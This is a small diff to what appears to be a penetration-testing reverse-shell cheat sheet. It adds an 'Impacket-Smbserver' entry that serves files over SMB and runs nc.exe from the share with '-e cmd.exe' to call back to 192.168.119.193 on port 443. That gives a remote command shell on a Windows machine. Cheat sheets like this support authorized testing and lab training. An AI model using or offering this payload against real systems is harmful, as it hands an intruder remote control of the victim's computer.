@@ -6,6 +6,13 @@
 
 ## Linux
 
+### Impacket-Smbserver
+
+```bash
+impacket-smbserver share .
+\\192.168.119.193\share\nc.exe -e cmd.exe 192.168.119.193 443
+```
+
 ### Bash TCP
 
 ```bash
